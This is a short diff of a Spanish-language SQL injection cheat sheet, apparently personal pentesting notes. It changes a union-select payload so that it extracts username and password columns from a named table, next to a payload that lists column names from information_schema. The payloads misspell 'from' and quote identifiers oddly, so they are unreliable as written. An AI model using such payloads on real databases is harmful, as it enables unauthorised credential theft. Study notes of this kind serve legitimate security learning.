@@ -56,7 +56,7 @@ Ver las columnas de la tabla que nos interesa
 `' union select NULL,column_name form information_schema.columns where table_schema='nombrebbdd' and table_name='nombretabla'-- -`
 
 Ver datos de las columnas de la tabla seleccionada
-`' union select username,p form information_schema.columns where table_schema='nombrebbdd' and table_name='nombretabla'-- -`
+`' union select username,password form 'nombretabla'.'nombrecolumna'-- -`
 
 
 ## Listar contenido de las bases de datos
